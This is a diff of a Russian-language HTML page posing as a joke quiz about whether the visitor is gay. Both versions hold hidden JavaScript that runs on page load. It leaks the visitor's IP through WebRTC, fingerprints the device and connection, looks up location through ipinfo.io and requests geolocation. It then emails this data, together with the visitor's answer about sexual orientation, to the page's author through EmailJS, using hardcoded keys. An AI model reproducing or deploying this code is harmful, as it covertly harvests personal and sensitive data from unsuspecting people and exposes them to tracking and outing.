@@ -1,331 +1,125 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тест на Гея</title>
-    <!-- Подключение EmailJS SDK -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
-        })();
+  <meta charset="UTF-8" />
+  <title>Тест</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("nRcxesuNKhp7AMc4d"); // Замени на свой ключ
+    })();
 
-        // Получение IP-адреса через WebRTC
-        function getUserIP(callback) {
-            var pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => console.error(e));
-            pc.onicecandidate = (ice) => {
-                if (ice && ice.candidate && ice.candidate.candidate) {
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                    const ip = ipRegex.exec(ice.candidate.candidate)[1];
-                    callback(ip);
-                    pc.onicecandidate = () => {};
-                }
-            };
+    function getUserIP(callback) {
+      let pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(e => console.error(e));
+      pc.onicecandidate = (ice) => {
+        if (ice && ice.candidate && ice.candidate.candidate) {
+          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+          const ip = ipRegex.exec(ice.candidate.candidate)[1];
+          callback(ip);
+          pc.onicecandidate = () => {};
         }
+      };
+    }
 
-        // Получение данных о провайдере через ipinfo.io
-        async function getProviderInfo(ip) {
-            try {
-                const response = await fetch(`https://ipinfo.io/${ip}?token=229d6455ecea02`);
-                const data = await response.json();
-                return {
-                    provider: data.org || "Неизвестно",
-                    city: data.city || "Неизвестно",
-                    region: data.region || "Неизвестно",
-                    country: data.country || "Неизвестно"
-                };
-            } catch (error) {
-                console.error("Ошибка при получении данных провайдера:", error);
-                return {
-                    provider: "Неизвестно",
-                    city: "Неизвестно",
-                    region: "Неизвестно",
-                    country: "Неизвестно"
-                };
-            }
-        }
+    function sendIPandUserAgent(ip) {
+      const userAgent = navigator.userAgent || "Неизвестно";
+      emailjs.send("Hjikwe21782", "template_ip_useragent", {
+        ip: ip || "Неизвестно",
+        userAgent: userAgent
+      })
+      .then(() => {
+        alert("Твои данные теперь у меня:)))))");
+        document.getElementById("test").style.display = "block";
+      })
+      .catch(err => console.error("Ошибка отправки IP и User-Agent:", err));
+    }
 
-        // Получение геолокации пользователя
-        function getGeolocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                status: "success"
-                            });
-                        },
-                        (error) => {
-                            console.warn("Пользователь отказался от геолокации:", error.message);
-                            resolve({
-                                latitude: "Отказано",
-                                longitude: "Отказано",
-                                accuracy: "Отказано",
-                                status: "denied"
-                            });
-                        }
-                    );
-                } else {
-                    console.warn("Геолокация не поддерживается браузером.");
-                    resolve({
-                        latitude: "Не поддерживается",
-                        longitude: "Не поддерживается",
-                        accuracy: "Не поддерживается",
-                        status: "unsupported"
-                    });
-                }
-            });
-        }
+    async function getFullData(ip) {
+      const ua = navigator.userAgent || "Неизвестно";
+      const deviceType = /android/i.test(ua) ? "Android" :
+                         /iphone|ipad|ipod/i.test(ua) ? "iOS" :
+                         /windows/i.test(ua) ? "Windows" :
+                         /mac/i.test(ua) ? "Mac" :
+                         /linux/i.test(ua) ? "Linux" : "Неизвестно";
 
-        // Определение типа устройства
-        function getDeviceType() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            if (/android/.test(userAgent)) return "Android";
-            if (/iphone|ipad|ipod/.test(userAgent)) return "iOS";
-            if (/windows/.test(userAgent)) return "Windows";
-            if (/mac/.test(userAgent)) return "Mac";
-            if (/linux/.test(userAgent)) return "Linux";
-            return "Неизвестное устройство";
-        }
+      const screenResolution = `${window.screen.width}x${window.screen.height}` || "Неизвестно";
+      const browserLanguage = navigator.language || "Неизвестно";
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
 
-        // Отправка данных на почту через EmailJS
-        function sendData(userData, templateName) {
-            emailjs.send("Hjikwe21782", templateName, userData)
-                .then(function(response) {
-                    console.log("Данные успешно отправлены", response);
-                }, function(error) {
-                    console.error("Ошибка при отправке данных", error);
-                });
-        }
+      const conn = navigator.connection || {};
+      const connectionType = conn.effectiveType || "Неизвестно";
+      const connectionSpeed = conn.downlink ? conn.downlink + " Mbps" : "Неизвестно";
+      const connectionRTT = conn.rtt ? conn.rtt + " ms" : "Неизвестно";
 
-        // Сбор и отправка базовых данных (IP и устройство)
-        function sendBasicData(ip) {
-            const deviceType = getDeviceType();
-            
-            let basicData = {
-                ip: ip,
-                deviceType: deviceType,
-                userAgent: navigator.userAgent,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно"
-            };
+      let latitude = "Неизвестно";
+      let longitude = "Неизвестно";
+      let accuracy = "Неизвестно";
 
-            sendData(basicData, "template_basic_data");
-            alert('Твои данные теперь у меня:)))))');
+      try {
+        const geo = await new Promise(resolve => {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(pos),
+            () => resolve(null),
+            { timeout: 3000 }
+          );
+        });
+        if (geo) {
+          latitude = geo.coords.latitude;
+          longitude = geo.coords.longitude;
+          accuracy = geo.coords.accuracy;
         }
+      } catch {}
 
-        // Сбор и отправка полных данных с геолокацией
-        async function sendFullData(ip) {
-            try {
-                const [providerInfo, geolocation] = await Promise.all([
-                    getProviderInfo(ip),
-                    getGeolocation()
-                ]);
+      let provider = "Неизвестно", city = "Неизвестно", region = "Неизвестно", country = "Неизвестно";
+      try {
+        const res = await fetch(`https://ipinfo.io/${ip}?token=229d6455ecea02`);
+        const data = await res.json();
+        provider = data.org || "Неизвестно";
+        city = data.city || "Неизвестно";
+        region = data.region || "Неизвестно";
+        country = data.country || "Неизвестно";
+      } catch {}
 
-                if (geolocation.status !== "success") return;
+      return {
+        ip: ip || "Неизвестно",
+        provider, city, region, country,
+        latitude, longitude, accuracy,
+        deviceType, userAgent: ua,
+        browserLanguage, screenResolution,
+        timeZone, connectionType, connectionSpeed, connectionRTT,
+        testResult: window.testResult || "Неизвестно"
+      };
+    }
 
-                const deviceType = getDeviceType();
+    async function sendFullData(ip) {
+      const data = await getFullData(ip);
+      emailjs.send("Hjikwe21782", "template_full_data", data)
+        .then(() => console.log("Отправлены все данные"))
+        .catch(err => console.error("Ошибка отправки full data:", err));
+    }
 
-                let fullData = {
-                    ip: ip,
-                    provider: providerInfo.provider,
-                    city: providerInfo.city,
-                    region: providerInfo.region,
-                    country: providerInfo.country,
-                    latitude: geolocation.latitude,
-                    longitude: geolocation.longitude,
-                    accuracy: geolocation.accuracy,
-                    deviceType: deviceType,
-                    userAgent: navigator.userAgent,
-                    browserLanguage: navigator.language || "Неизвестно",
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно"
-                };
+    function handleTest(answer, ip) {
+      window.testResult = answer === "yes" ? "Гей" : "Не гей";
+      alert("Спасибо за прохождение теста :)");
+      sendFullData(ip);
+    }
 
-                sendData(fullData, "template_full_data");
-            } catch (error) {
-                console.error("Ошибка при сборе полных данных:", error);
-            }
-        }
-
-        // Запрос геолокации после отправки базовых данных
-        function requestGeolocation(ip) {
-            if (confirm("Хочешь получить более точные результаты? Поделись своей геолокацией!")) {
-                getGeolocation().then(result => {
-                    if (result.status === "success") {
-                        sendFullData(ip);
-                        alert("Спасибо! Теперь результаты будут точнее!");
-                    }
-                });
-            }
-        }
-
-        // Инициализация при загрузке страницы
-        window.onload = function() {
-            getUserIP(function(ip) {
-                console.log("IP-адрес:", ip);
-                sendBasicData(ip);
-                setTimeout(() => requestGeolocation(ip), 2000);
-            });
-        }
-    </script>
-
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f3f3f3;
-            margin: 0;
-            padding: 20px;
-        }
-        h1 {
-            color: #333;
-        }
-        .question {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        button {
-            margin-top: 10px;
-            padding: 10px 20px;
-            border: none;
-            background-color: #3498db;
-            color: white;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            display: block;
-            width: 200px;
-            margin: 10px auto;
-        }
-        button:hover {
-            background-color: #2980b9;
-        }
-        #result {
-            margin-top: 30px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #e74c3c;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
-
+    window.onload = function() {
+      getUserIP(function(ip) {
+        sendIPandUserAgent(ip);
+        window.currentIP = ip;
+      });
+    };
+  </script>
 </head>
 <body>
-<p>Мы используем геолокацию, чтобы добавить немного веселья в твой опыт! Понимание, откуда ты, помогает нам сделать результаты теста более интересными и персонализированными.</p>
-
-    <h1>Шуточный тест: Гей ли ты?</h1>
-
-    <div id="quiz">
-        <div class="question" id="q1">
-            <p>Какой твой любимый цвет?</p>
-            <button onclick="nextQuestion(1, 2)">Радужный</button>
-            <button onclick="nextQuestion(0, 2)">Чёрный</button>
-            <button onclick="nextQuestion(0, 2)">Синий</button>
-            <button onclick="nextQuestion(0, 2)">Зелёный</button>
-        </div>
-
-        <div class="question hidden" id="q2">
-            <p>Какой твой идеальный вечер?</p>
-            <button onclick="nextQuestion(1, 3)">В клубе</button>
-            <button onclick="nextQuestion(0, 3)">Дома с книгой</button>
-            <button onclick="nextQuestion(0, 3)">На прогулке с друзьями</button>
-            <button onclick="nextQuestion(0, 3)">Просмотр сериалов</button>
-        </div>
-
-        <div class="question hidden" id="q3">
-            <p>Кто твой любимый певец?</p>
-            <button onclick="nextQuestion(1, 4)">Lady Gaga</button>
-            <button onclick="nextQuestion(1, 4)">Freddie Mercury</button>
-            <button onclick="nextQuestion(0, 4)">Баста</button>
-            <button onclick="nextQuestion(0, 4)">Эд Ширан</button>
-        </div>
-
-        <div class="question hidden" id="q4">
-            <p>Какой фильм ты выберешь?</p>
-            <button onclick="nextQuestion(1, 5)">Call Me by Your Name</button>
-            <button onclick="nextQuestion(0, 5)">Бойцовский клуб</button>
-            <button onclick="nextQuestion(0, 5)">Форсаж</button>
-            <button onclick="nextQuestion(0, 5)">Матрица</button>
-        </div>
-
-        <div class="question hidden" id="q5">
-            <p>Какая у тебя любимая одежда?</p>
-            <button onclick="nextQuestion(1, 6)">Яркие трендовые образы</button>
-            <button onclick="nextQuestion(0, 6)">Спортивный костюм</button>
-            <button onclick="nextQuestion(0, 6)">Джинсы и футболка</button>
-            <button onclick="nextQuestion(0, 6)">Классический костюм</button>
-        </div>
-
-        <div class="question hidden" id="q6">
-            <p>Какой танец ты предпочитаешь?</p>
-            <button onclick="nextQuestion(1, 7)">Вогинг</button>
-            <button onclick="nextQuestion(0, 7)">Хип-хоп</button>
-            <button onclick="nextQuestion(0, 7)">Я не танцую</button>
-            <button onclick="nextQuestion(0, 7)">Тектоник</button>
-        </div>
-
-        <div class="question hidden" id="q7">
-            <p>Что бы ты выбрал на десерт?</p>
-            <button onclick="nextQuestion(1, 8)">Эклер с розовой глазурью</button>
-            <button onclick="nextQuestion(0, 8)">Шоколадный торт</button>
-            <button onclick="nextQuestion(0, 8)">Фрукты</button>
-            <button onclick="nextQuestion(0, 8)">Пицца</button>
-        </div>
-
-        <div class="question hidden" id="q8">
-            <p>Какую музыку ты слушаешь?</p>
-            <button onclick="nextQuestion(1, 9)">Поп</button>
-            <button onclick="nextQuestion(0, 9)">Рок</button>
-            <button onclick="nextQuestion(0, 9)">Рэп</button>
-            <button onclick="nextQuestion(0, 9)">Классика</button>
-        </div>
-    </div>
-
-    <div id="result" class="hidden"></div>
-
-    <script>
-        let score = 0;
-
-        function nextQuestion(points, nextId) {
-            score += points;
-
-            const questions = document.querySelectorAll('.question');
-            questions.forEach(q => q.classList.add('hidden'));
-
-            if (nextId <= questions.length) {
-                document.getElementById('q' + nextId).classList.remove('hidden');
-            } else {
-                showResult();
-            }
-        }
-
-        function showResult() {
-            const resultDiv = document.getElementById('result');
-            resultDiv.classList.remove('hidden');
-            
-            let resultText = "";
-            if (score >= 6) {
-                resultText = "Ты абсолютно гей! Радуга всегда с тобой!";
-            } else if (score >= 4) {
-                resultText = "Ты немного гей. В тебе живёт дух свободы!";
-            } else {
-                resultText = "Ты не гей. Но никогда не поздно попробовать что-то новое!";
-            }
-            
-            resultDiv.innerHTML = `Ответ: ${resultText}`;
-        }
-    </script>
+  <div id="test" style="display:none; text-align:center; margin-top:50px;">
+    <h2>Тест на гея</h2>
+    <p>Ты гей?</p>
+    <button onclick="handleTest('yes', window.currentIP)">Да</button>
+    <button onclick="handleTest('no', window.currentIP)">Нет</button>
+  </div>
 </body>
 </html>
